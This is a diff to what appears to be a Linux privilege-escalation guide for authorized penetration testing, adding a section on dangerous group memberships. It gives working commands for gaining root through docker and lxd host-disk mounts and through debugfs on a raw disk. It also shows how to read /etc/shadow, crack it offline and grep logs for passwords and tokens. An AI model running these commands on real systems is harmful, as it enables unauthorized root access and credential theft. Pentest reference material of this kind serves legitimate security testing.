@@ -200,7 +200,50 @@ gdb -p <PID> -batch -ex 'call (char*)getenv("PASSWORD")'
 
 ---
 
-## 6. Container & Kubernetes Escapes
+## 6. Dangerous Group Memberships
+
+Some local groups grant a direct, deterministic path to root. Check your groups before reaching for anything fragile.
+
+```bash
+id    # watch for: docker, lxd, lxc, disk, adm, shadow, sudo, wheel, video
+```
+
+- **`docker`** — effectively root. Mount the host filesystem into a throwaway container:
+
+    ```bash
+    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+    ```
+
+- **`lxd` / `lxc`** — import a small image and attach the host disk as a device inside a privileged container:
+
+    ```bash
+    lxc init alpine r00t -c security.privileged=true
+    lxc config device add r00t host disk source=/ path=/mnt/root recursive=true
+    lxc start r00t && lxc exec r00t /bin/sh   # /mnt/root is the host FS, as root
+    ```
+
+- **`disk`** — raw access to the block device. Read any file (including `/etc/shadow`) or write with `debugfs`:
+
+    ```bash
+    debugfs /dev/sda1        # interactive: cat /etc/shadow, or write arbitrary files
+    ```
+
+- **`adm`** — read system logs; credentials and tokens frequently leak into them:
+
+    ```bash
+    grep -riE "password|token|secret|api[_-]?key" /var/log 2>/dev/null | head
+    ```
+
+- **`shadow`** — read `/etc/shadow` directly, then crack offline (`unshadow` + hashcat/john).
+
+- **`sudo` / `wheel`** — you can invoke `sudo`; go back to `sudo -l` and the GTFOBins paths above.
+
+!!! warning "Confirm the group is really yours"
+    `id` shows effective groups; a group you only hold via a secondary login or a file ACL may not grant the device access these techniques assume. Verify with a harmless read before writing anything.
+
+---
+
+## 7. Container & Kubernetes Escapes
 
 ```bash
 # --- Am I in a container? ---
@@ -258,7 +301,7 @@ Remove the pod and any generated evidence as soon as the approved validation is 
 
 ---
 
-## 7. Kernel Exploits (Last Resort)
+## 8. Kernel Exploits (Last Resort)
 
 ```bash
 # 1. Identify the exact kernel version
